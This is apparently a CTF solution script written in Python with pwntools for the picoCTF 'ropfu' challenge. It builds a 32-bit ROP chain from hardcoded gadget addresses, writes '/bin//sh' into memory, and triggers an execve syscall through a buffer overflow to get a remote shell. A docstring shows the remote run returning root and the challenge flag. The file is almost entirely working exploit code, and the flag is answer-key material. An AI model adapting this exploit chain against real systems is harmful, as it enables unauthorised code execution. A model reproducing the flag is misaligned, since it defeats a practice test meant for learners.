#!/usr/bin/env python3

'''
$ ./ropfu.py remote
[*] './ropfu.bin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to saturn.picoctf.net on port 52126: Done
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls
flag.txt
vuln
$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_0f1f9878}
'''

from sys import argv
from pwn import *

# context.log_level = 'error'

BIN = './ropfu.bin'

IP = 'saturn.picoctf.net'
PORT = 52126

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


# generate payload
padding = b'A' * (16 + 12)
payload = padding

# rop gadgets
ret = p32(0x0804900e)
pop_eax = p32(0x080b074a)
pop_ebx = p32(0x08049022)
pop_ecx = p32(0x08049e39)
pop_edx_ebx = p32(0x080583c9)
mov_eax_in_ptr_edx = p32(0x08059102)
execute_syscall = p32(0x0804a3d2)

inc_edx = p32(0x0805f964)
mov_edx_0xffffffff = p32(0x08058569)
zero_edx = mov_edx_0xffffffff + inc_edx

mov_eax_in_ecx = p32(0x080939e8)

inc_eax = p32(0x0808055e)
zero_eax = p32(0x0804fb90)

# write /bin/sh in memory
writable_memory = elf.bss()

payload += pop_eax
payload += b"/bin"
payload += pop_edx_ebx
payload += p32(writable_memory) + p32(0xffffffff)
payload += mov_eax_in_ptr_edx

payload += pop_eax
payload += b"//sh"
payload += pop_edx_ebx
payload += p32(writable_memory + 4) + p32(0xffffffff)
payload += mov_eax_in_ptr_edx

# write the address containing /bin/sh string into memory
payload += pop_eax
payload += p32(writable_memory)
payload += pop_edx_ebx
payload += p32(writable_memory + 12) + p32(0xffffffff)
payload += mov_eax_in_ptr_edx

# prepare syscall
# eax = 0xb
# ebx = "/bin/sh"
# ecx = 0x0
# edx = 0x0
payload += zero_edx
payload += pop_ebx
payload += p32(writable_memory)

payload += zero_eax
payload += mov_eax_in_ecx
payload += inc_eax * 0xb

# execute syscall
payload += execute_syscall

# send payload
assert(b'\x00' not in payload)
p = open_instance()
p.readuntil(
    b'How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!')
p.sendline(payload)

p.interactive()
